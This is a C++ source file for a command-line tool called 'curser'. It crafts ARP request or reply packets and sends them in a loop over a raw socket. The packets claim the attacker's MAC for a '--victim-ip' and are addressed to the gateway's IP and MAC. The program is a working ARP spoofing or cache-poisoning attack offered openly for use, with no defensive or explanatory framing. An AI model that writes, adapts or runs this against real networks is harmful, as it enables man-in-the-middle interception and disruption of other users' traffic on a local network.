#include <iostream>
#include <cstring>
#include "ll_endp.h"
#include "arp.h"
#include "utils.h"
#include "raw_socket.h"

#define VERSION_MAJOR 0
#define VERSION_MINOR 1
#define VERSION_MICRO 0

#define STRINGIFY0(s) # s
#define STRINGIFY(s) STRINGIFY0(s)

#define VERSION STRINGIFY(VERSION_MAJOR) "." STRINGIFY(VERSION_MINOR) "." STRINGIFY(VERSION_MICRO)


int main(int argc, char** argv) {
    static const char* usage = "Usage:  curser [ -<flag> [<val>] | --<name> [<val>] ]...\n\n   "
                               "-i, --interface-name       traffic output interface\n   "
                               "-o, --op-code              type of packet[req/rep]\n   "
                               "-l, --loop                 retry count[default(1)]\n   "
                               "    --victim-ip            victim ip address\n   "
                               "    --dst-ip               gateway ip\n   "
                               "    --dst-mac              gateway mac address\n   "
                               "-h, --help                 display usage information and exit\n   "
                               "-v, --version              display version information and exit\n";

    std::string_view ifname;
    uint32_t vpa{0};
    uint32_t gpa{0};
    uint8_t sha[6]{};
    uint8_t gha[6]{};
    arp_op op = {};
    int loop_count{1};

    if (argc < 11) {
        if (argc == 2 && (!std::strcmp(argv[1], "-h") || !std::strcmp(argv[1], "--help"))) {
            std::cout << usage << std::endl;
            return EXIT_SUCCESS;
        }

        if (argc == 2 && (!std::strcmp(argv[1], "-v") || !std::strcmp(argv[1], "--version"))) {
            std::cout << "curser version " << VERSION << std::endl;
            return EXIT_SUCCESS;
        }
        std::cout << usage << std::endl;
        return EXIT_FAILURE;
    }

    for (int i = 1; i < argc; i++) {
        if (!std::strcmp(argv[i], "-i") || !std::strcmp(argv[i], "--interface-name")) {
            ifname = argv[++i];
        } else if (!std::strcmp(argv[i], "-o") || !std::strcmp(argv[i], "--op-code")) {
            if (!std::strcmp(argv[++i], "req")) {
                op = arp_op::request;
            } else if (!std::strcmp(argv[i], "rep")) {
                op = arp_op::reply;
            } else {
                perror("Invalid op code");
                return EXIT_FAILURE;
            }
        } else if (!std::strcmp(argv[i], "-l") || !std::strcmp(argv[i], "--loop")) {
            loop_count = std::stoi(argv[++i]);
        } else if (!std::strcmp(argv[i], "--victim-ip")) {
            vpa = inet_bf(argv[++i]);
        } else if (!std::strcmp(argv[i], "--dst-ip")) {
            gpa = inet_bf(argv[++i]);
        } else if (!std::strcmp(argv[i], "--dst-mac")) {
            std::sscanf(argv[++i], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &gha[0], &gha[1], &gha[2],
                        &gha[3], &gha[4], &gha[5]);
        } else {
            std::cout << usage << std::endl;
            return EXIT_FAILURE;
        }
    }


    getMacAddr(ifname.data(), sha);
    const ll_endpoint ep{ifname, sha};
    raw_socket sock{};
    sock.bind(ep);

    for (int i = 0; i < loop_count; ++i) {
        auto pktBuilder = PktBuilder(op)
                .set_hrd(0x0001)
                .set_pro(0x0800)
                .set_hln(6)
                .set_pln(4)
                .set_sha(sha)
                .set_spa(vpa)
                .set_tpa(gpa)
                .set_tha(gha)
                .set_op(as_integer(op));

        sock.sendto(pktBuilder.packet(), pktBuilder.size());
        std::cout << "+sent packet on the interface " << ep << std::endl;
    }

    return EXIT_SUCCESS;
}
